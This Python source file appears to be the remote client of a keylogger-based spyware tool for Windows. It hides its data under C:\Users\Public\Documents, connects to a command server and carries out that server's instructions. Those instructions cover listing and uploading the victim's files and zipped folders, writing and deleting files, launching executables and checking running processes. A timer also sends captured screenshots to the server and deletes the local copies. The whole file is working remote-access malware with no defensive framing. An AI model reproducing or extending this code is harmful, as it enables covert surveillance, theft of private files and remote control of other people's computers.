from message import Message, Header, Command
from client import Client
from KeyLogger.repeated_timer import RepeatedTimer
from psutil import process_iter
from shutil import rmtree
from time import sleep
from sys import exit
import zipfile
import os

FOLDER_PATH = r"C:\Users\Public\Documents\data"
SS_PATH = r"C:\Users\Public\Documents\data\ss"
LOG_PATH = r"C:\Users\Public\Documents\data\logs"
LOGGER_PATH = r"C:\Users\Public\Documents\data\logger.exe"
CONF_PATH = r"C:\Users\Public\Documents\data\conf"

_client = None
_timer_ss_upload = 60 * 1

if not os.path.exists(FOLDER_PATH):
    os.makedirs(FOLDER_PATH)
if not os.path.exists(SS_PATH):
    os.makedirs(SS_PATH)
if not os.path.exists(LOG_PATH):
    os.makedirs(LOG_PATH)


def connection_with_server(_client):
    while True:
        try:
            # Try to send message from queue
            if len(_client.queue_send) > 0:
                _client.log('Sending command to server...')
                msg = _client.queue_send.pop(0)
                _client.send_message(msg)

            # Try to process message from queue
            if len(_client.queue_receive) > 0:
                msg = _client.queue_receive.pop(0)

                if msg.header == Header.IDLE:
                    _client.log('Local Client not connected!')

                if msg.header == Header.EXIT:
                    exit()

                if msg.header == Header.COMMAND:
                    _client.log('New command received!')
                    result_msg = _execute_command(msg)
                    _client.queue_send.append(result_msg)

        except ConnectionError:
            _client.connected_to_server = False
            _client.log('Connection with server failed!')

        sleep(0.5)


def _execute_command(msg):
    if msg.command == Command.LS:
        msg = command_ls(msg)
    elif msg.command == Command.LS_TREE:
        msg = command_ls_tree(msg)
    elif msg.command == Command.CREATE_FOLDER:
        msg = command_crete_folder(msg)
    elif msg.command == Command.UPLOAD_FILE:
        msg = command_upload_file(msg)
    elif msg.command == Command.DOWNLOAD_FILE:
        msg = command_download_file(msg)
    elif msg.command == Command.UPLOAD_FOLDER:
        msg = command_upload_folder(msg)
    elif msg.command == Command.REMOVE_FILE:
        msg = command_remove_file(msg)
    elif msg.command == Command.REMOVE_FOLDER:
        msg = command_remove_folder(msg)
    elif msg.command == Command.START_EXE:
        msg = command_start_exe(msg)
    elif msg.command == Command.CHECK_PROCESS_RUNNING:
        msg = command_check_process_running(msg)
    else:
        msg = Message(Header.RESPONSE, Command.COMMAND_NOT_KNOWN)

    return msg


# region COMMANDS
def zipdir(str_path):
    zipf = zipfile.ZipFile(f'{FOLDER_PATH}/zipped', 'w', zipfile.ZIP_DEFLATED)
    base_name = os.path.basename(str_path)
    for root, dirs, files in os.walk(str_path):
        for file in files:
            zipf.write(os.path.join(root, file), f'{base_name}\\{file}')
    zipf.close()


def get_path(path):
    path = str(path)
    path = path.replace('_data_', FOLDER_PATH)
    path = path.replace('_logs_', LOG_PATH)
    path = path.replace('_ss_', SS_PATH)
    path = path.replace('_logger_', LOGGER_PATH)
    path = path.replace('_user_', os.getlogin())

    return path


def command_ls(msg):
    path = get_path(msg.payload)

    msg = Message(Header.RESPONSE, Command.LS)

    result = ''
    try:
        entries = os.scandir(path)
        for entry in entries:
            result += f'{entry.name}{"" if entry.is_file() else "/"} - {os.path.getsize(path + os.sep + entry.name) / 1024:.2f} Kb\n'
    except Exception as e:
        result = e

    msg.payload = result

    return msg


def command_ls_tree(msg):
    path = get_path(msg.payload)

    msg = Message(Header.RESPONSE, Command.LS_TREE)

    result = ''
    try:
        for root, dirs, files in os.walk(path):
            level = root.replace(path, '').count(os.sep)
            indent = ' ' * 4 * level
            result += '{}{}/\n'.format(indent, os.path.basename(root))
            subindent = ' ' * 4 * (level + 1)
            for f in sorted(files, key=lambda f: os.path.getsize(root + os.sep + f)):
                result += f'{subindent}{f} - {(os.path.getsize(root + os.sep + f)/1024.)/1024.:.2f}MB\n'
    except Exception as e:
        result = e

    msg.payload = result

    return msg


def command_crete_folder(msg):
    path = get_path(msg.payload)

    msg = Message(Header.RESPONSE, Command.CREATE_FOLDER)

    try:
        os.makedirs(path)
        msg.payload = 'succesful'
    except Exception as e:
        msg.payload = e

    return msg


def command_upload_file(msg):
    path = get_path(msg.payload)

    msg = Message(Header.RESPONSE, Command.UPLOAD_FILE)

    try:
        with open(path, 'rb') as file:
            result = (os.path.basename(path), file.read())
    except Exception as e:
        result = e

    msg.payload = result

    return msg


def command_upload_folder(msg):
    path = get_path(msg.payload)

    msg = Message(Header.RESPONSE, Command.UPLOAD_FOLDER)

    try:
        zipdir(path)
        with open(f'{FOLDER_PATH}\\zipped', 'rb') as file:
            result = (os.path.basename(path), file.read())
    except Exception as e:
        result = e

    msg.payload = result

    return msg


def command_download_file(msg):
    path = get_path(msg.payload[0])

    data = msg.payload[1]

    msg = Message(Header.RESPONSE, Command.DOWNLOAD_FILE)
    msg.payload = 'Success'

    try:
        with open(path, 'wb') as file:
            file.write(data)
    except Exception as e:
        msg.payload = e

    return msg


def command_remove_file(msg):
    path = get_path(msg.payload)

    msg = Message(Header.RESPONSE, Command.REMOVE_FILE)

    try:
        os.remove(path)
        msg.payload = 'successful'
    except Exception as e:
        msg.payload = e

    return msg


def command_remove_folder(msg):
    path = get_path(msg.payload)

    msg = Message(Header.RESPONSE, Command.REMOVE_FOLDER)

    try:
        rmtree(path)
        msg.payload = 'successful'
    except Exception as e:
        msg.payload = e

    return msg


def command_start_exe(msg):
    path = get_path(msg.payload)

    msg = Message(Header.RESPONSE, Command.START_EXE)

    try:
        os.startfile(path)
        msg.payload = 'successful'
    except Exception as e:
        msg.payload = e

    return msg


def command_check_process_running(msg):
    process_name = get_path(msg.payload)

    msg = Message(Header.RESPONSE, Command.CHECK_PROCESS_RUNNING)

    msg.payload = f'Process with name "{process_name}" not found.'

    for proc in process_iter():
        try:
            # Check if process name contains the given name string.
            if process_name.lower() in proc.name().lower():
                msg.payload = f'Process with name "{process_name}" is running.'
        except Exception as e:
            msg.payload = e

    return msg
# endregion


def load_conf():
    global _timer_ss_upload
    try:
        with open(CONF_PATH, 'r') as conf_file:
            conf = eval(conf_file.read())
            _timer_ss_upload = int(conf['upload_ss_delay'])
            autostart_list = conf['autostart']

            for asp in autostart_list:
                command_start_exe(Message(Header.COMMAND, payload=asp))

    except Exception as e:
        with open(f"{LOG_PATH}\\logs", "a+", encoding='utf-8') as f:
            f.write(f'_remote_client\n{e}\n')


def auto_upload_ss():
    global _client

    if not _client.connected_to_server:
        return

    try:
        msg = Message(Header.AUTO_UPLOAD, Command.UPLOAD_FILE)

        paths = os.listdir(SS_PATH)
        if not len(paths) > 0:
            return
        path = SS_PATH + '\\' + paths[0]

        with open(path, 'rb') as file:
            result = (os.path.basename(path), file.read())

        os.remove(path)

        msg.payload = result

        _client.queue_send.append(msg)
    except Exception as e:
        with open(f"{LOG_PATH}\\logs", "a+", encoding='utf-8') as f:
            f.write(f'_remote_client\n{e}\n')


if __name__ == "__main__":
    try:
        load_conf()
    except Exception as e:
        with open(f"{LOG_PATH}\\logs", "a+", encoding='utf-8') as f:
            f.write(f'_remote_client\n{e}\n')

    try:
        RepeatedTimer(_timer_ss_upload, auto_upload_ss)
    except Exception as e:
        with open(f"{LOG_PATH}\\logs", "a+", encoding='utf-8') as f:
            f.write(f'_remote_client\n{e}\n')

    try:
        # _client = Client('Remote Client', '127.0.0.1', 55555)
        _client = Client('Remote Client', 'server_ip', 55555)
        connection_with_server(_client)
    except Exception as e:
        with open(f"{LOG_PATH}\\logs", "a+", encoding='utf-8') as f:
            f.write(f'_remote_client\n{e}\n')